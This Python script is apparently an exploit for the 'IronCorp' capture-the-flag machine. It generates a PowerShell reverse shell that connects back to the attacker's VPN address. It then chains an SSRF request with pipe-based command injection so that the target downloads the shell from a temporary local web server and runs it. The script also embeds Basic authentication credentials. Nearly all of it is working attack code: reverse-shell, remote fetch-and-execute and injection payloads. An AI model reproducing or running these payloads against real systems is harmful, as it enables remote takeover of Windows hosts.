import http.server
import socketserver
import threading
import requests
import time
import urllib.parse
import netifaces as ni

def urlencode(str):
  return urllib.parse.quote(str)


def urldecode(str):
  return urllib.parse.unquote(str)

banner = r'''
 _____                        ____
|_   _|                      / ____|                    ( )
  | |   _ __   ___   _ __   | |       ___   _ __  _ __  |/  ___
  | |  | '__| / _ \ | '_ \  | |      / _ \ | '__|| '_ \    / __| 
 _|  _ | |   | (_) || | | | | |____ | (_) || |   | |_) |   \__ \ 
|_____||_|    \___/ |_| |_|  \_____| \___/ |_|   | .__/    |___/
                                                 | |
                                                 |_|
 _____              _
|  __ \            | |
| |  | |  ___  ___ | |_  _ __   ___   _   _   ___  _ __ 
| |  | | / _ \/ __|| __|| '__| / _ \ | | | | / _ \| '__|
| |__| ||  __/\__ \| |_ | |   | (_) || |_| ||  __/| |   
|_____/  \___||___/ \__||_|    \___/  \__, | \___||_|   
                                       __/ |            
                                       |___/         

            	      Created by Gutierre0x80
        [+]â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ[+]

'''
print(banner)
url = "http://admin.ironcorp.me:11025/?r="
ssrf = 'http://internal.ironcorp.me:11025/name.php?name=Equinox|'
headers = {
    "Authorization": "Basic YWRtaW46cGFzc3dvcmQxMjM="
}

#Your VPN IP 
ip_vpn = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

#Create the shell.ps1
content_shell = ("$client = New-Object System.Net.Sockets.TCPClient('"
         + ip_vpn
         + "',9001);"
         "$stream = $client.GetStream();"
         "[byte[]]$bytes = 0..65535|%{0};"
         "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
         "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
         "$sendback = (iex $data 2>&1 | Out-String);"
         "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
         "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
         "$stream.Write($sendbyte,0,$sendbyte.Length);"
         "$stream.Flush()}"
         "$client.Close()")

locate_shell = "shell.ps1"

with open(locate_shell, "w") as arquivo:
    arquivo.write(content_shell)

#Payload for download your shell in target

download_payload = r'powershell.exe Invoke-WebRequest http://' + ip_vpn + r':1234/shell.ps1" -OutFile "E:\xampp\htdocs\internal\shell.ps1"'

PayloadDownload = ''
payload_download_encoded = urlencode(download_payload)
download_encoded = ssrf + "" + payload_download_encoded

for character in download_encoded:
    PayloadDownload = PayloadDownload + "%" + (hex(ord(character))[2:]).lower()

#Function for execute  your shell in target

PayloadExecute = ''
execute = ssrf + "" +"powershell.exe%20./shell.ps1"

for character in execute:
    PayloadExecute = PayloadExecute + "%" + (hex(ord(character))[2:]).lower()

time.sleep(1)
 
#WebServer to download exploit

SSRFDownload = url + '' + PayloadDownload
port = 1234

diretorio_raiz = '.'
handler = http.server.SimpleHTTPRequestHandler
class MyHandler(handler):
    def translate_path(self, path):
        path = super().translate_path(path)
        if path.endswith('/'):
            path += 'shell.ps1'
        return path
class WebServer:
    def __init__(self):
        self.server = socketserver.TCPServer(("", port), MyHandler)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True
        self.shutdown_timer = threading.Timer(9, self.shutdown_server)
    def start(self):
        print(f"Web server started on: {port}.")
        self.server_thread.start()
        self.shutdown_timer.start()
        dfinal = requests.get(SSRFDownload, headers=headers)

    def shutdown_server(self):
        self.server.shutdown()
        self.server.server_close()
        print("Server shut down.")

web_server = WebServer()
web_server.start()

while web_server.server_thread.is_alive():
    time.sleep(1)

#Execute the exploit in the target

SSRFExecute = url + '' + PayloadExecute
print("cross your fingers")
efinal = requests.get(SSRFExecute, headers=headers)